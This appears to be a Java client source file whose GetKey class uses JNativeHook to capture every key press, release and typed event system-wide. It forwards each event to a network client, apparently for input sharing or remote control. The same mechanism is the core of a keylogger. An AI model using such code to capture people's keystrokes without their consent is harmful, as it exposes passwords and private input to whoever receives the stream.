package org.au.client.utill;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.au.client.Main;
import org.au.client.client.NIOClient;

import java.awt.event.KeyEvent;

import static java.awt.event.KeyEvent.VK_A;
import static org.au.client.Main.*;

public class GetKey implements NativeKeyListener {
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("KeyPressed:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        NIOClient.addMessage("KeyPressed:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        if (!list.contains(NativeKeyEvent.getKeyText(e.getKeyCode()))) {
            list.add(NativeKeyEvent.getKeyText(e.getKeyCode()));
        }

    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("KeyReleased:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        NIOClient.addMessage("KeyReleased:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        list.remove(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        //System.out.println("KeyTyped:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        NIOClient.addMessage("KeyTyped:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
}